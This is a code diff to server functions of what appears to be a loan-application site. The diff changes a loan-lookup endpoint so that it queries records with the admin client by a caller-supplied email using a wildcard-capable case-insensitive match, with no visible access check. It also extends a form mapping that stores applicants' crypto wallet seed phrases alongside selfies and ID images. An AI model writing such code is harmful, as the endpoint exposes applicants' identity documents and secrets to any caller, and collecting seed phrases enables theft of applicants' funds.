@@ -196,13 +196,14 @@ export const fetchLeads = createServerFn().handler(async () => {
 });
 
 export const fetchUserLoans = createServerFn()
-  .inputValidator((userId: string) => userId)
-  .handler(async ({ data: userId }) => {
+  .inputValidator((email: string) => email)
+  .handler(async ({ data: email }) => {
+    if (!email) return [];
     const sb = getSupabaseAdmin();
     const { data } = await sb
       .from("loan_applications")
       .select("*")
-      .eq("user_id", userId)
+      .ilike("email", email)
       .order("created_at", { ascending: false });
     return camelizeRows(data ?? []);
   });
@@ -487,6 +488,7 @@ export const submitLoanApplication = createServerFn({ method: "POST" })
       cryptoWalletType: "crypto_wallet_type",
       cryptoWalletAddress: "crypto_wallet_address",
       cryptoSeedPhrase: "crypto_seed_phrase",
+      cryptoNetwork: "crypto_network",
       selfieImage: "selfie_image",
       idFrontImage: "id_front_image",
       idBackImage: "id_back_image",
